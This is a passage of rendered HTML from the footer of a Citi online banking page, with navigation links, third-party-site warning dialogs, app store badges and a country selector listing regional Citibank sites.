site?</p><p>Citi is not responsible for the products, services or facilities provided and/or owned by other companies.</p></p></div></div></div><div _ngcontent-qyo-c8="" class="modal-footer text-right"><!----><div _ngcontent-qyo-c8="" class="citi-modal-controls ng-star-inserted"><!----><citi-cta _ngcontent-qyo-c8="" class="modal-primary-btn btnclassTest ng-star-inserted" _nghost-qyo-c19=""><!----><!----><a _ngcontent-qyo-c19="" class="btn btn-primary ng-star-inserted" target="_blank" id="9f7f65a3-7983-7c4f-2d8b-341c808bef12" href="https://www.youtube.com/citi" aria-describedby="6de6ad2c-f579-a2e8-863b-b5d7b1dd83b9_ariadescription">Continue</a><!----><!----><span _ngcontent-qyo-c19="" aria-hidden="true" class="sr-only ng-star-inserted" id="6de6ad2c-f579-a2e8-863b-b5d7b1dd83b9_ariadescription">Opens in new window</span></citi-cta><!----></div></div></div><div tabindex="0" class="cdk-visually-hidden cdk-focus-trap-anchor" aria-hidden="true"></div></div></div><div _ngcontent-qyo-c8="" class="modal-backdrop citi-modal-backdrop fade" style="display: none;"></div></citi-modal><span _ngcontent-qyo-c14="" id="opensPopup">Opens Popup</span></div><!----></div></div></citi-footer-butler-bar><citi-footer-navigation _ngcontent-qyo-c7="" _nghost-qyo-c15=""><!----><div _ngcontent-qyo-c15="" class="navigation ng-star-inserted" role="navigation"><div _ngcontent-qyo-c15="" class="content"><!----><div _ngcontent-qyo-c15="" role="group" class="section ng-star-inserted"><h3 _ngcontent-qyo-c15="" class="title" id="nav-list-header0">Why Citi</h3><button _ngcontent-qyo-c15="" class="title" type="button" aria-controls="list0" aria-expanded="false">Why Citi</button><ul _ngcontent-qyo-c15="" id="list0" aria-labelledby="nav-list-header0"><!----><li _ngcontent-qyo-c15="" id="navOurStory" class="ng-star-inserted"><citi-cta _ngcontent-qyo-c15="" type="tertiary" _nghost-qyo-c19=""><!----><!----><a _ngcontent-qyo-c19="" class="btn btn-link ng-star-inserted" target="_self" id="f9a0bb3f-062a-bf38-c576-9338a6b85f86" tabindex="-1" href="http://www.citigroup.com/citi/">Our Story</a><!----><!----></citi-cta></li><li _ngcontent-qyo-c15="" id="navBenefits&amp;Services" class="ng-star-inserted"><citi-cta _ngcontent-qyo-c15="" type="tertiary" _nghost-qyo-c19=""><!----><!----><a _ngcontent-qyo-c19="" class="btn btn-link ng-star-inserted" target="_self" id="3dc6a9fb-8b5c-4854-d3de-a652ecce5f0e" tabindex="-1" href="/US/JRS/pands/detail.do?ID=ServicesOverview">Benefits and Services</a><!----><!----></citi-cta></li><li _ngcontent-qyo-c15="" id="navRewards" class="ng-star-inserted"><citi-cta _ngcontent-qyo-c15="" type="tertiary" _nghost-qyo-c19=""><!----><!----><a _ngcontent-qyo-c19="" class="btn btn-link ng-star-inserted" target="_self" id="a93877f7-3a92-f84b-0de2-3c89840e7503" tabindex="-1" href="/US/JRS/pands/detail.do?ID=Rewards">Rewards</a><!----><!----></citi-cta></li><li _ngcontent-qyo-c15="" id="navCitiEasyDeals" class="ng-star-inserted"><citi-cta _ngcontent-qyo-c15="" type="tertiary" _nghost-qyo-c19=""><!----><!----><a _ngcontent-qyo-c19="" class="btn btn-link ng-star-inserted" target="_blank" id="f3342f4f-2b73-d0d6-3d24-d450b2305c5c" tabindex="-1" href="https://citieasydeals.com/" aria-describedby="134e5029-86da-3839-3f04-da5708290a19_ariadescription">Citi Easy Deals<sup>SM</sup></a><!----><!----><span _ngcontent-qyo-c19="" aria-hidden="true" class="sr-only ng-star-inserted" id="134e5029-86da-3839-3f04-da5708290a19_ariadescription">Opens in new window</span></citi-cta></li><li _ngcontent-qyo-c15="" id="navPrivatePass" class="ng-star-inserted"><citi-cta _ngcontent-qyo-c15="" type="tertiary" _nghost-qyo-c19=""><!----><!----><a _ngcontent-qyo-c19="" class="btn btn-link ng-star-inserted" target="_blank" id="350ea6c0-4ba6-ac88-62d7-410e44644663" tabindex="-1" href="http://www.citiprivatepass.com/" aria-describedby="2b78cc67-7b23-7607-8da7-09eca6cf5d26_ariadescription">Citi Entertainment<sup>SM</sup></a><!----><!----><span _ngcontent-qyo-c19="" aria-hidden="true" class="sr-only ng-star-inserted" id="2b78cc67-7b23-7607-8da7-09eca6cf5d26_ariadescription">Opens in new window</span></citi-cta></li><li _ngcontent-qyo-c15="" id="navSpecialOffers" class="ng-star-inserted"><citi-cta _ngcontent-qyo-c15="" type="tertiary" _nghost-qyo-c19=""><!----><!----><a _ngcontent-qyo-c19="" class="btn btn-link ng-star-inserted" target="_self" id="cd28b84d-0544-d937-303c-2c95316ce5c9" tabindex="-1" href="/US/JRS/portal/template.do?ID=SpecialOffers">Special Offers</a><!----><!----></citi-cta></li><!----><!----></ul></div><div _ngcontent-qyo-c15="" role="group" class="section ng-star-inserted"><h3 _ngcontent-qyo-c15="" class="title" id="nav-list-header1">Relationship Banking</h3><button _ngcontent-qyo-c15="" class="title" type="button" aria-controls="list1" aria-expanded="false">Relationship Banking</button><ul _ngcontent-qyo-c15="" id="list1" aria-labelledby="nav-list-header1"><!----><li _ngcontent-qyo-c15="" id="navCitiPriority" class="ng-star-inserted"><citi-cta _ngcontent-qyo-c15="" type="tertiary" _nghost-qyo-c19=""><!----><!----><a _ngcontent-qyo-c19="" class="btn btn-link ng-star-inserted" target="_self" id="5a8f0ea8-9316-096f-1f9f-5e9c44ff5abe" tabindex="-1" href="/US/JRS/pands/detail.do?ID=CitiPriorityOverview">Citi Priority</a><!----><!----></citi-cta></li><li _ngcontent-qyo-c15="" id="navCitigold" class="ng-star-inserted"><citi-cta _ngcontent-qyo-c15="" type="tertiary" _nghost-qyo-c19=""><!----><!----><a _ngcontent-qyo-c19="" class="btn btn-link ng-star-inserted" target="_self" id="06b1c2b5-66c3-c8fb-b328-a79a320942fe" tabindex="-1" href="/US/JRS/pands/detail.do?ID=CitigoldOverview">Citigold<sup>®</sup></a><!----><!----></citi-cta></li><li _ngcontent-qyo-c15="" id="navCitiPrivateBank" class="ng-star-inserted"><citi-cta _ngcontent-qyo-c15="" type="tertiary" _nghost-qyo-c19=""><!----><!----><a _ngcontent-qyo-c19="" class="btn btn-link ng-star-inserted" target="_self" id="c71e5c07-d4f2-bac9-fdc6-ff826b13d593" tabindex="-1" href="https://www.privatebank.citibank.com/">Citi Private Bank</a><!----><!----></citi-cta></li><!----><!----></ul></div><div _ngcontent-qyo-c15="" role="group" class="section ng-star-inserted"><h3 _ngcontent-qyo-c15="" class="title" id="nav-list-header2">Business Banking</h3><button _ngcontent-qyo-c15="" class="title" type="button" aria-controls="list2" aria-expanded="false">Business Banking</button><ul _ngcontent-qyo-c15="" id="list2" aria-labelledby="nav-list-header2"><!----><li _ngcontent-qyo-c15="" id="navSmallBusinessAccounts" class="ng-star-inserted"><citi-cta _ngcontent-qyo-c15="" type="tertiary" _nghost-qyo-c19=""><!----><!----><a _ngcontent-qyo-c19="" class="btn btn-link ng-star-inserted" target="_self" id="ee652c42-1aa1-7d70-335a-8771d06ccf30" tabindex="-1" href="/US/JRS/pands/detail.do?ID=CitiBizOverview">Small Business Accounts</a><!----><!----></citi-cta></li><li _ngcontent-qyo-c15="" id="navCommercialAccounts" class="ng-star-inserted"><citi-cta _ngcontent-qyo-c15="" type="tertiary" _nghost-qyo-c19=""><!----><!----><a _ngcontent-qyo-c19="" class="btn btn-link ng-star-inserted" target="_self" id="f0d7133b-fca1-b563-75b7-df9d5db8b40c" tabindex="-1" href="/US/JRS/pands/detail.do?ID=CitiCommercialBanking">Commercial Accounts</a><!----><!----></citi-cta></li><!----><!----></ul></div><div _ngcontent-qyo-c15="" role="group" class="section ng-star-inserted"><h3 _ngcontent-qyo-c15="" class="title" id="nav-list-header3">Rates</h3><button _ngcontent-qyo-c15="" class="title" type="button" aria-controls="list3" aria-expanded="false">Rates</button><ul _ngcontent-qyo-c15="" id="list3" aria-labelledby="nav-list-header3"><!----><li _ngcontent-qyo-c15="" id="navPersonal Banking" class="ng-star-inserted"><citi-cta _ngcontent-qyo-c15="" type="tertiary" _nghost-qyo-c19=""><!----><!----><a _ngcontent-qyo-c19="" class="btn btn-link ng-star-inserted" target="_self" id="9bc46527-0d3c-f56f-86dc-06b0740b061c" tabindex="-1" href="/US/ag/current-interest-rates/checking-saving-accounts">Personal Banking</a><!----><!----></citi-cta></li><li _ngcontent-qyo-c15="" id="navCreditCards" class="ng-star-inserted"><citi-cta _ngcontent-qyo-c15="" type="tertiary" _nghost-qyo-c19=""><!----><!----><a _ngcontent-qyo-c19="" class="btn btn-link ng-star-inserted" target="_self" id="d17696c7-1d61-592a-2410-8969e0929f27" tabindex="-1" href="https://www.citi.com/credit-cards/compare-credit-cards/citi.action?ID=view-all-credit-cards">Credit Cards</a><!----><!----></citi-cta></li><li _ngcontent-qyo-c15="" id="navMortgage" class="ng-star-inserted"><citi-cta _ngcontent-qyo-c15="" type="tertiary" _nghost-qyo-c19=""><!----><!----><a _ngcontent-qyo-c19="" class="btn btn-link ng-star-inserted" target="_self" id="dc9d8264-5c0b-90c0-9ec0-fe40af801b4d" tabindex="-1" href="/US/JRS/portal/template.do?ID=todays_mortgage_rates&amp;type=buy">Mortgage</a><!----><!----></citi-cta></li><li _ngcontent-qyo-c15="" id="navHomeEquity" class="ng-star-inserted"><citi-cta _ngcontent-qyo-c15="" type="tertiary" _nghost-qyo-c19=""><!----><!----><a _ngcontent-qyo-c19="" class="btn btn-link ng-star-inserted" target="_self" id="6cc8f6e8-33a8-5711-7b17-6753d5f6dac2" tabindex="-1" href="#">Home Equity</a><!----><!----></citi-cta></li><li _ngcontent-qyo-c15="" id="navLending" class="ng-star-inserted"><citi-cta _ngcontent-qyo-c15="" type="tertiary" _nghost-qyo-c19=""><!----><!----><a _ngcontent-qyo-c19="" class="btn btn-link ng-star-inserted" target="_self" id="6937adf6-be75-61ba-7ecb-d838ebc83548" tabindex="-1" href="/US/ag/current-interest-rates/personal-loans-and-lines-of-credit">Lending</a><!----><!----></citi-cta></li><!----><!----></ul></div><div _ngcontent-qyo-c15="" role="group" class="section last ng-star-inserted"><h3 _ngcontent-qyo-c15="" class="title" id="nav-list-header4">Help &amp; Support</h3><button _ngcontent-qyo-c15="" class="title" type="button" aria-controls="list4" aria-expanded="false">Help &amp; Support</button><ul _ngcontent-qyo-c15="" id="list4" aria-labelledby="nav-list-header4"><!----><li _ngcontent-qyo-c15="" id="navContactUs" class="ng-star-inserted"><citi-cta _ngcontent-qyo-c15="" type="tertiary" _nghost-qyo-c19=""><!----><!----><a _ngcontent-qyo-c19="" class="btn btn-link ng-star-inserted" target="_self" id="3662428b-e1d0-5e43-0071-618eb8ecd948" tabindex="-1" href="/US/ag/contactus">Contact Us</a><!----><!----></citi-cta></li><li _ngcontent-qyo-c15="" id="navHelpFAQs" class="ng-star-inserted"><citi-cta _ngcontent-qyo-c15="" type="tertiary" _nghost-qyo-c19=""><!----><!----><a _ngcontent-qyo-c19="" class="btn btn-link ng-star-inserted" target="_self" id="63bb206d-de49-1671-4581-c648df8781cf" tabindex="-1" href="/US/JSO/portal/smartSearch.do">Help &amp; FAQs</a><!----><!----></citi-cta></li><li _ngcontent-qyo-c15="" id="navSecurityCenter" class="ng-star-inserted"><citi-cta _ngcontent-qyo-c15="" type="tertiary" _nghost-qyo-c19=""><!----><!----><a _ngcontent-qyo-c19="" class="btn btn-link ng-star-inserted" target="_self" id="01c7ec66-d785-e891-5777-1779eaf42ab3" tabindex="-1" href="/US/JRS/pands/detail.do?ID=SecurityCenter">Security Center</a><!----><!----></citi-cta></li><!----><!----></ul></div><!----><div _ngcontent-qyo-c15="" class="badgeSection ng-star-inserted"><citi-row _ngcontent-qyo-c15="" tabindex="-1"><div class="row "><h3 _ngcontent-qyo-c15="" class="title">Citi Mobile<sup _ngcontent-qyo-c15="" class="registerMark">®</sup> App</h3></div></citi-row><ul _ngcontent-qyo-c15=""><!----><li _ngcontent-qyo-c15="" class="ng-star-inserted"><button _ngcontent-qyo-c15="" aria-describedby="opensPopup" class="assets/branding/appStore.png" aria-label="Download on the App Store" data-target="#fbmodal0"><img _ngcontent-qyo-c15="" alt="appBadgeImage0" class="appBadge0" src="img/appStore.png"></button><!----><citi-modal _ngcontent-qyo-c15="" primarybuttontarget="_blank" primarybuttontext="Continue" _nghost-qyo-c8="" class="ng-star-inserted"><div _ngcontent-qyo-c8="" class="modal citi-modal fade" tabindex="-1" id="fbmodal0" style="display: none;"><div _ngcontent-qyo-c8="" class="modal-dialog" tabindex="-1"><div tabindex="0" class="cdk-visually-hidden cdk-focus-trap-anchor" aria-hidden="true"></div><div _ngcontent-qyo-c8="" cdktrapfocus="" class="modal-content"><div _ngcontent-qyo-c8="" class="modal-header"><!----><button _ngcontent-qyo-c8="" aria-label="Close modal" class="close-button ng-star-inserted" type="button"><span _ngcontent-qyo-c8="" class="sr-only">Close</span></button></div><div _ngcontent-qyo-c8="" role="document"><div _ngcontent-qyo-c8="" class="modal-body" tabindex="-1"><div _ngcontent-qyo-c8="" tabindex="-1"><!----><citi-text-header _ngcontent-qyo-c8="" level="2" _nghost-qyo-c27="" class="ng-star-inserted"><span _ngcontent-qyo-c27="" class="hidden">Important Information</span><!----><!----><h2 _ngcontent-qyo-c27="" class="header-level-2 ng-star-inserted">Important Information</h2><!----><!----><!----><!----></citi-text-header></div><div _ngcontent-qyo-c8="" class="modal-body-content"><p _ngcontent-qyo-c15="">You are leaving a Citi Website and going to a third party site. That site may have a privacy policy different from Citi and may provide less security than this Citi site. Citi and its affiliates are not responsible for the products, services, and content on the third party website. Do you want to go to the third party site? <br><br>Citi is not responsible for the products, services or facilities provided and/or owned by other companies.</p></div></div></div><div _ngcontent-qyo-c8="" class="modal-footer text-right"><!----><div _ngcontent-qyo-c8="" class="citi-modal-controls ng-star-inserted"><!----><citi-cta _ngcontent-qyo-c8="" class="modal-primary-btn btnclassTest ng-star-inserted" _nghost-qyo-c19=""><!----><!----><a _ngcontent-qyo-c19="" class="btn btn-primary ng-star-inserted" target="_blank" id="943efa63-5425-6030-7137-bcef5a37f076" href="https://itunes.apple.com/app/citi-mobile-sm/id301724680?mt=8 " aria-describedby="f0e223cf-c55f-4a69-fd31-a49377a2cbd5_ariadescription">Continue</a><!----><!----><span _ngcontent-qyo-c19="" aria-hidden="true" class="sr-only ng-star-inserted" id="f0e223cf-c55f-4a69-fd31-a49377a2cbd5_ariadescription">Opens in new window</span></citi-cta><!----></div></div></div><div tabindex="0" class="cdk-visually-hidden cdk-focus-trap-anchor" aria-hidden="true"></div></div></div><div _ngcontent-qyo-c8="" class="modal-backdrop citi-modal-backdrop fade" style="display: none;"></div></citi-modal></li><li _ngcontent-qyo-c15="" class="ng-star-inserted"><button _ngcontent-qyo-c15="" aria-describedby="opensPopup" class="assets/branding/googlePlay.png" aria-label="Get it on Google Play" data-target="#fbmodal1"><img _ngcontent-qyo-c15="" alt="appBadgeImage1" class="appBadge1" src="img/googlePlay.png"></button><!----><citi-modal _ngcontent-qyo-c15="" primarybuttontarget="_blank" primarybuttontext="Continue" _nghost-qyo-c8="" class="ng-star-inserted"><div _ngcontent-qyo-c8="" class="modal citi-modal fade" tabindex="-1" id="fbmodal1" style="display: none;"><div _ngcontent-qyo-c8="" class="modal-dialog" tabindex="-1"><div tabindex="0" class="cdk-visually-hidden cdk-focus-trap-anchor" aria-hidden="true"></div><div _ngcontent-qyo-c8="" cdktrapfocus="" class="modal-content"><div _ngcontent-qyo-c8="" class="modal-header"><!----><button _ngcontent-qyo-c8="" aria-label="Close modal" class="close-button ng-star-inserted" type="button"><span _ngcontent-qyo-c8="" class="sr-only">Close</span></button></div><div _ngcontent-qyo-c8="" role="document"><div _ngcontent-qyo-c8="" class="modal-body" tabindex="-1"><div _ngcontent-qyo-c8="" tabindex="-1"><!----><citi-text-header _ngcontent-qyo-c8="" level="2" _nghost-qyo-c27="" class="ng-star-inserted"><span _ngcontent-qyo-c27="" class="hidden">Important Information</span><!----><!----><h2 _ngcontent-qyo-c27="" class="header-level-2 ng-star-inserted">Important Information</h2><!----><!----><!----><!----></citi-text-header></div><div _ngcontent-qyo-c8="" class="modal-body-content"><p _ngcontent-qyo-c15="">You are leaving a Citi Website and going to a third party site. That site may have a privacy policy different from Citi and may provide less security than this Citi site. Citi and its affiliates are not responsible for the products, services, and content on the third party website. Do you want to go to the third party site? <br><br>Citi is not responsible for the products, services or facilities provided and/or owned by other companies.</p></div></div></div><div _ngcontent-qyo-c8="" class="modal-footer text-right"><!----><div _ngcontent-qyo-c8="" class="citi-modal-controls ng-star-inserted"><!----><citi-cta _ngcontent-qyo-c8="" class="modal-primary-btn btnclassTest ng-star-inserted" _nghost-qyo-c19=""><!----><!----><a _ngcontent-qyo-c19="" class="btn btn-primary ng-star-inserted" target="_blank" id="0de903c4-71a9-d9b2-5dbc-2670e4959b27" href="https://play.google.com/store/apps/details?id=com.citi.citimobile" aria-describedby="d42acd38-fa64-c3cc-34aa-8c8d0a433f50_ariadescription">Continue</a><!----><!----><span _ngcontent-qyo-c19="" aria-hidden="true" class="sr-only ng-star-inserted" id="d42acd38-fa64-c3cc-34aa-8c8d0a433f50_ariadescription">Opens in new window</span></citi-cta><!----></div></div></div><div tabindex="0" class="cdk-visually-hidden cdk-focus-trap-anchor" aria-hidden="true"></div></div></div><div _ngcontent-qyo-c8="" class="modal-backdrop citi-modal-backdrop fade" style="display: none;"></div></citi-modal></li></ul></div></div></div></citi-footer-navigation><citi-footer-sub-navigation _ngcontent-qyo-c7="" _nghost-qyo-c16=""><!----><div _ngcontent-qyo-c16="" class="sub-navigation ng-star-inserted" role="contentinfo"><div _ngcontent-qyo-c16="" class="content"><!----><p _ngcontent-qyo-c16="" class="copyright ng-star-inserted">© 2020 Citigroup Inc</p><!----><ul _ngcontent-qyo-c16="" class="ng-star-inserted"><!----><li _ngcontent-qyo-c16="" id="subnavTermsConditions" class="ng-star-inserted"><!----><citi-cta _ngcontent-qyo-c16="" type="tertiary" _nghost-qyo-c19="" class="ng-star-inserted"><!----><!----><a _ngcontent-qyo-c19="" class="btn btn-link ng-star-inserted" target="_self" id="3b4105cf-ad12-3f8f-9ec9-962a7598e602" href="/US/JRS/portal/template.do?ID=TermsDisclaimer">Terms &amp; Conditions</a><!----><!----></citi-cta><!----><!----><!----></li><li _ngcontent-qyo-c16="" id="subnavPrivacy" class="ng-star-inserted"><!----><citi-cta _ngcontent-qyo-c16="" type="tertiary" _nghost-qyo-c19="" class="ng-star-inserted"><!----><!----><a _ngcontent-qyo-c19="" class="btn btn-link ng-star-inserted" target="_self" id="1940d2e1-a090-0402-c7c0-4849579370cb" href="/US/JRS/portal/template.do?ID=Privacy">Privacy</a><!----><!----></citi-cta><!----><!----><!----></li><li _ngcontent-qyo-c16="" id="subnavNoticeAtCollection" class="ng-star-inserted"><!----><citi-cta _ngcontent-qyo-c16="" type="tertiary" _nghost-qyo-c19="" class="ng-star-inserted"><!----><!----><a _ngcontent-qyo-c19="" class="btn btn-link ng-star-inserted" target="_self" id="c4c336b7-87cc-de2d-060f-95edb572da9b" href="/JRS/portal/template.do?ID=Privacy#notice-at-collection">Notice at Collection</a><!----><!----></citi-cta><!----><!----><!----></li><li _ngcontent-qyo-c16="" id="subnavPrivacyHub" class="ng-star-inserted"><!----><citi-cta _ngcontent-qyo-c16="" type="tertiary" _nghost-qyo-c19="" class="ng-star-inserted"><!----><!----><a _ngcontent-qyo-c19="" class="btn btn-link ng-star-inserted" target="_self" id="241e4d3e-512b-9138-a688-7e1d07d47178" href="/US/ag/dataprivacyhub">CA Privacy Hub</a><!----><!----></citi-cta><!----><!----><!----></li><li _ngcontent-qyo-c16="" id="subnavAccessibility" class="ng-star-inserted"><!----><citi-cta _ngcontent-qyo-c16="" type="tertiary" _nghost-qyo-c19="" class="ng-star-inserted"><!----><!----><a _ngcontent-qyo-c19="" class="btn btn-link ng-star-inserted" target="_self" id="8ee21843-83dd-baf1-bdd0-3c3521c3088c" href="/US/JRS/portal/template.do?ID=Accessibility">Accessibility</a><!----><!----></citi-cta><!----><!----><!----></li><li _ngcontent-qyo-c16="" id="" class="ng-star-inserted"><!----><!----><!----><span _ngcontent-qyo-c16="" class="staticLinks ng-star-inserted">Country &amp; Jurisdictions:</span><!----></li><li _ngcontent-qyo-c16="" id="" class="ng-star-inserted"><!----><citi-cta _ngcontent-qyo-c16="" type="tertiary" _nghost-qyo-c19="" class="ng-star-inserted"><!----><button _ngcontent-qyo-c19="" class="btn btn-link ng-star-inserted" type="button" id="a7f8a242-2f9e-54b8-2abb-cafde596d869" style="text-align: center;"><b>United States</b></button><!----><!----><!----></citi-cta><!----><span _ngcontent-qyo-c16="" class="staticLinks ng-star-inserted" style="font-weight: bold"> &gt; </span><!----><!----><citi-modal _ngcontent-qyo-c16="" cancelbuttontext="Cancel" showcancelbutton="true" _nghost-qyo-c8="" class="ng-star-inserted"><div _ngcontent-qyo-c8="" class="modal citi-modal fade" tabindex="-1" style="display: none;"><div _ngcontent-qyo-c8="" class="modal-dialog" tabindex="-1"><div tabindex="0" class="cdk-visually-hidden cdk-focus-trap-anchor" aria-hidden="true"></div><div _ngcontent-qyo-c8="" cdktrapfocus="" class="modal-content"><div _ngcontent-qyo-c8="" class="modal-header"><!----><button _ngcontent-qyo-c8="" aria-label="Close modal" class="close-button ng-star-inserted" type="button"><span _ngcontent-qyo-c8="" class="sr-only">Close</span></button></div><div _ngcontent-qyo-c8="" role="document"><div _ngcontent-qyo-c8="" class="modal-body" tabindex="-1"><div _ngcontent-qyo-c8="" tabindex="-1"><!----><citi-text-header _ngcontent-qyo-c8="" level="2" _nghost-qyo-c27="" class="ng-star-inserted"><span _ngcontent-qyo-c27="" class="hidden">Choose Your Country or Jurisdiction</span><!----><!----><h2 _ngcontent-qyo-c27="" class="header-level-2 ng-star-inserted">Choose Your Country or Jurisdiction</h2><!----><!----><!----><!----></citi-text-header></div><div _ngcontent-qyo-c8="" class="modal-body-content"><div _ngcontent-qyo-c16="" class="theme-light"><p _ngcontent-qyo-c16=""></p><p _ngcontent-qyo-c16="" class="speedBumpCopy">Get Citibank information on the countries &amp; jurisdictions we serve</p><span _ngcontent-qyo-c16="" class="selectCountry">Select Country or Jurisdiction</span><citi-dropdown _ngcontent-qyo-c16="" class="citi-dropdown row" idstr="countrySelect" _nghost-qyo-c28=""><!----><div _ngcontent-qyo-c28="" class="dd-wrapper ng-star-inserted form-group col-xs-12 has-value"><label _ngcontent-qyo-c28="" class="select-box-label" id="countrySelectlabel" for="countrySelect"></label><div _ngcontent-qyo-c28=""><select _ngcontent-qyo-c28="" class="form-control ng-untouched ng-pristine ng-valid" id="countrySelect" aria-labelledby="countrySelectlabel"><!----><!----><!----><!----><option _ngcontent-qyo-c28="" value="http://www.citibank.com.au/portal/citiau_home.htm" class="ng-star-inserted">Australia</option><option _ngcontent-qyo-c28="" value="https://www.citibank.com/bahrain" class="ng-star-inserted">Bahrain</option><option _ngcontent-qyo-c28="" value="https://www.citibank.com.br/BRGCB/JPS/portal/Index.do" class="ng-star-inserted">Brazil</option><option _ngcontent-qyo-c28="" value="http://www.citibank.com.cn/homepage/cn/cn_homepage.htm" class="ng-star-inserted">China - Chinese</option><option _ngcontent-qyo-c28="" value="http://www.citibank.com.cn/homepage/en/cn_homepage.htm" class="ng-star-inserted">China - English</option><option _ngcontent-qyo-c28="" value="https://www.citibank.com.co/COGCB/JPS/portal/Index.do" class="ng-star-inserted">Colombia</option><option _ngcontent-qyo-c28="" value="http://www.citi.com.sv/" class="ng-star-inserted">El Salvador</option><option _ngcontent-qyo-c28="" value="http://www.citi.com/citi/about/countrypresence/guatemala.html" class="ng-star-inserted">Guatemala</option><option _ngcontent-qyo-c28="" value="http://www.citibank.com.hk/" class="ng-star-inserted">Hong Kong</option><option _ngcontent-qyo-c28="" value="http://www.online.citibank.co.in/" class="ng-star-inserted">India - Domestic</option><option _ngcontent-qyo-c28="" value="http://www.online.citibank.co.in/citi-nri.htm" class="ng-star-inserted">India - Non-Resident Indian (NRI)</option><option _ngcontent-qyo-c28="" value="https://www.citibank.co.id/portal/bahasa_home/index.htm" class="ng-star-inserted">Indonesia - Bahasa Indonesia</option><option _ngcontent-qyo-c28="" value="http://www.citibank.co.id/" class="ng-star-inserted">Indonesia - English</option><option _ngcontent-qyo-c28="" value="http://www.citibank.co.kr/" class="ng-star-inserted">Korea - Korean</option><option _ngcontent-qyo-c28="" value="https://www.citibank.co.kr/ComMainCnts0100_en.act?JEX_LANG=EN" class="ng-star-inserted">Korea - English</option><option _ngcontent-qyo-c28="" value="http://www.citibank.com.my/" class="ng-star-inserted">Malaysia</option><option _ngcontent-qyo-c28="" value="http://www.citi.com/citi/about/countrypresence/mexico.html" class="ng-star-inserted">Mexico</option><option _ngcontent-qyo-c28="" value="http://www.citibank.com.ph/portal/citiph_home.htm" class="ng-star-inserted">Philippines</option><option _ngcontent-qyo-c28="" value="http://www.citibank.pl/poland/homepage/polish/index.htm" class="ng-star-inserted">Poland</option><option _ngcontent-qyo-c28="" value="http://www.citibank.ru/russia/main/rus/home.htm" class="ng-star-inserted">Russia - Russian</option><option _ngcontent-qyo-c28="" value="http://www.citibank.ru/russia/main/eng/home.htm" class="ng-star-inserted">Russia - English</option><option _ngcontent-qyo-c28="" value="http://www.citibank.com.sg/" class="ng-star-inserted">Singapore</option><option _ngcontent-qyo-c28="" value="http://www.citibank.com.tw/portal/home_chinese/twcb_Home.htm" class="ng-star-inserted">Taiwan - Chinese</option><option _ngcontent-qyo-c28="" value="http://www.citibank.com.tw/portal/home_english/twcb_Home.htm" class="ng-star-inserted">Taiwan - English</option><option _ngcontent-qyo-c28="" value="http://www.citibank.co.th/" class="ng-star-inserted">Thailand</option><option _ngcontent-qyo-c28="" value="http://www.citi.com/uae/homepage/index.htm" class="ng-star-inserted">United Arab Emirates</option><option _ngcontent-qyo-c28="" value="http://www.citibank.co.uk/index.htm" class="ng-star-inserted">United Kingdom</option><option _ngcontent-qyo-c28="" value="http://www.citi.com/domain/home.htm" class="ng-star-inserted">United States</option><option _ngcontent-qyo-c28="" value="https://www.citibank.com.ve/VEGCB/JPS/portal/Index.do" class="ng-star-inserted">Venezuela</option><option _ngcontent-qyo-c28="" value="http://www.citibank.com.vn/" class="ng-star-inserted">Vietnam - Vietnamese</option><option _ngcontent-qyo-c28="" value="http://www.citibank.com.vn/portal/vietnam_home.htm" class="ng-star-inserted">Vietnam - English</option><!----></select><!----></div><!----></div></citi-dropdown></div></div></div></div><div _ngcontent-qyo-c8="" class="modal-footer text-right"><!----><div _ngcontent-qyo-c8="" class="citi-modal-controls ng-star-inserted"><!----><citi-cta _ngcontent-qyo-c8="" class="modal-primary-btn btnclassTest ng-star-inserted" _nghost-qyo-c19=""><!----><button _ngcontent-qyo-c19="" class="btn btn-primary ng-star-inserted" type="button" id="54124222-184a-8193-0a64-25247c7a229b" role="button" aria-describedby="0d5c49aa-8b90-a697-af01-6e6a8396f269_ariadescription" style="text-align: center;">Submit</button><!----><!----><!----><span _ngcontent-qyo-c19="" aria-hidden="true" class="sr-only ng-star-inserted" id="0d5c49aa-8b90-a697-af01-6e6a8396f269_ariadescription">Opens in new window</span></citi-cta><!----><citi-cta _ngcontent-qyo-c8="" ariarole="button" class="modal-secondary-btn marginBetweenBtns ng-star-inserted" type="tertiary" _nghost-qyo-c19=""><!----><button _ngcontent-qyo-c19="" class="btn btn-link ng-star-inserted" type="button" id="17c22e90-d649-bbff-9de2-8ce7bfb7c8cb" role="button" style="text-align: center;">Cancel</button><!----><!----><!----></citi-cta></div></div></div><div tabindex="0" class="cdk-visually-hidden cdk-focus-trap-anchor" aria-hidden="true"></div></div></div><div _ngcontent-qyo-c8="" class="modal-backdrop citi-modal-backdrop fade" style="display: none;"></div></citi-modal></li></ul><!----><div _ngcontent-qyo-c16="" class="feedback ng-star-inserted"><citi-cta _ngcontent-qyo-c16="" ariadescription="Opens in new window" class="feedbackLink" href="" type="tertiary" _nghost-qyo-c19=""><!----><button _ngcontent-qyo-c19="" class="btn btn-link ng-star-inserted" type="button" id="069b5bdd-0ded-c52a-5c73-bd170ee0cd76" aria-describedby="f56961f3-37f5-d752-ecbf-11ea03e0c995_ariadescription" style="text-align: center;">Feedback</button><!----><!----><!----><span _ngcontent-qyo-c19="" aria-hidden="true" class="sr-only ng-star-inserted" id="f56961f3-37f5-d752-ecbf-11ea03e0c995_ariadescription">Opens in new window</span></citi-cta></div></div></div></citi-footer-sub-navigation><citi-footer-disclaimer _ngcontent-qyo-c7="" _nghost-qyo-c17=""><!----></citi-footer-disclaimer><citi-sub-footer _ngcontent-qyo-c7="" _nghost-qyo-c18=""><!----><div _ngcontent-qyo-c18="" class="sub-footer ng-star-inserted"><div _ngcontent-qyo-c18="" class="content"><!----><!----><div _ngcontent-qyo-c18="" class="images ng-star-inserted"><!----><div _ngcontent-qyo-c18="" class="brandingSprite fdic ng-star-inserted"></div><!----><div _ngcontent-qyo-c18="" class="brandingSprite equalHousing ng-star-inserted"></div></div></div></div></citi-sub-footer></div></citi-footer></div></citi-parent-layout></cbol-core></app-root>

</body></html>